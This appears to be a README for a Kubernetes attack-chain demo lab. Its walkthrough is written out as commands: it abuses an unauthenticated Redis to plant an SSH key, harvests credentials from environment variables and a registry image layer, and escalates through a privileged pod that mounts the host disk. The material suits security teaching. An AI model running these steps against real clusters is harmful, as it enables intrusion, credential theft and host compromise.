# Kubernetes Hacking Demo

Quick and dirty setup for the following demo hacking through a Kubernetes cluster:
- Assuming an attacker gained access to `01-access` through some non-K8s-vulnerability
- Attacker can then explore unauthenticated Redis instance and gain OS access to it (has SSH running for simplicity)
- `02-redis` has an env var with credentials for a registry
- Registry contains one image that has an SSH key in it
- Using that SSH key, attacker can gain access to `04-bastion`
- Bastion has a K8s service account that can create pods - also `privileged` ones, which is the `Game Over` step.

## Setup

- Images were on Dockerhub for the Demo, Dockerfiles are maintained in this repo as well
- Adjusting the image in the registry with a new SSH key seems relevant:
  - That was done by starting the registry with a volume for the images, then pushing to it, then re-building the image by `COPY`ing that directory in the Dockerfile
- You need to create certificates for the registry. 

## Walk-through Steps

```
kubectl exec -it 01-access-pod -- bash
nmap -p 6379 192.168.194.0/24
export redis_ip="192.168.194.103"
redis-cli -h $redis_ip
    info
    exit
ssh-keygen
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h $redis_ip -x set ssh_key
redis-cli -h $redis_ip
    config set dir /root/.ssh
    config set dbfilename "authorized_keys"
    save
ssh $redis_ip
printenv
cat /proc/1/environ

nmap -p 443 192.168.194.0/24
export registry_ip="192.168.194.104"
curl -k --user testuser:testpassword "https://$registry_ip:443/v2/_catalog"
curl -k -o layer --user testuser:testpassword "https://$registry_ip:443/v2/base_image/blobs/sha256:20c3a8b9cfa20e73d69d62c65d2290f5fa2162ffef7a822024b2a3e197aa5d9b"
tar xf layer
l /root/.ssh
nmap -p 22 192.168.194.0/24
ssh
mkdir /root/.kube
cat <<EOF > /root/.kube/config
apiVersion: v1
clusters:
- cluster:
    insecure-skip-tls-verify: true
    server: https://10.96.0.1:443
  name: 10.96.0.1:443
contexts:
- context:
    cluster: 10.96.0.1:443
    user: myexample-sa
  name: default
current-context: default
kind: Config
preferences: {}
users:
- name: myexample-sa
  user:
    token: TOKEN
EOF
kubectl auth can-i --list
cat <<EOF > container.yaml
apiVersion: v1
kind: Pod
metadata:
  name: shell-demo
spec:
  securityContext:
    runAsUser: 0
    runAsGroup: 0
  containers:
  - name: ml-testing
    image: uchimata/system-analysis
    command: ["sleep"]
    args: ["infinity"]
    securityContext:
      privileged: true
  dnsPolicy: Default
EOF
kubectl apply -f container.yaml
kubectl exec -it shell-demo -- bash
mount /dev/sda2 /mnt
```
